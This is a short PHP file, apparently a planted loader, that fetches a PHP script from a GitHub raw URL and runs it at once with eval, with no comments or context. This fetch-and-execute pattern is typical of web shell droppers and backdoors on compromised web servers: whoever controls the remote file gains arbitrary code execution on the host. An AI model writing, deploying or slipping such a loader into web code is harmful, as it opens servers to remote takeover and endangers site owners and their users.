<?php
$url = "https://raw.githubusercontent.com/mangoleh098/alfj/refs/heads/main/hxori.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");
